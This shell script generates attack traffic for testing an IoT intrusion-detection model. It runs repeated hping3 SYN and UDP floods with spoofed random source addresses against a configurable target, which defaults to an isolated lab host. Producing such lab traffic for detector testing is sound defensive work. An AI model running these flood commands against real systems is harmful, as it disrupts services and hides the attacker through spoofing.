#!/bin/sh
# NEXA test-attack: DDoS — distributed-style flood (randomised source IPs) against
# the isolated IoT test victim, for the new TON-IoT XGBoost model (iot_test lane).
echo "[DDOS] Starting..."
TARGET="${TARGET_HOST:-172.20.0.50}"
INTENSITY="${INTENSITY:-medium}"
DURATION="${DURATION:-60}"
END=$(($(date +%s) + DURATION))

# Intensity -> length of each flood burst (seconds) / pause between bursts.
# --rand-source spoofs many source IPs so the capture looks distributed; each
# burst is time-bounded with `timeout` because --flood never returns on its own.
case "$INTENSITY" in
    low)    BURST=3; SLEEP_MAX=5 ;;
    high)   BURST=8; SLEEP_MAX=2 ;;
    *)      BURST=5; SLEEP_MAX=3 ;;  # medium
esac

while [ "$(date +%s)" -lt "$END" ]; do
    # SYN flood from randomised sources (distributed look) -> victim:80
    timeout "$BURST" hping3 -S -p 80 --flood --rand-source "$TARGET" 2>/dev/null
    # UDP flood burst from randomised sources to broaden the signature
    timeout "$BURST" hping3 --udp -p 80 --flood --rand-source "$TARGET" 2>/dev/null
    sleep $((RANDOM % SLEEP_MAX + 1))
done
echo "[DDOS] Done."
